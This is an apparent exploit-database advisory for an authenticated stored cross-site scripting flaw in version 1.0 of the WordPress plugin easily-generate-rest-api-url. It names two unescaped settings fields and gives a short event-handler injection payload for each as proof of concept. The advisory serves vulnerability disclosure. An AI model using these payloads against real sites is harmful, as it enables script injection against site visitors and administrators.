# Exploit Title: easily-generate-rest-api-url <= 1.0 - Authenticated Stored Cross-Site Scripting (XSS)
# DownloadLink: https://wordpress.org/plugins/easily-generate-rest-api-url/
# Affects Version:1.0
# Original Researcher:websafe2021
# Description:
The WordPress plugin  easily-generate-rest-api-url does not escape its 'add_custom_service_style " and "search_texts" From "Custom RESTAPI Settings' settings, allowing high privilege users such as admin to perform Cross-Site Scripting attacks even when the unfiltered_html capability is disallowed

# Proof of Concept:
```
add_custom_service_style="OnMoUsEoVeR=prompt(777)//
search_texts="OnMoUsEoVeR=prompt(777)//
 ```
 
 
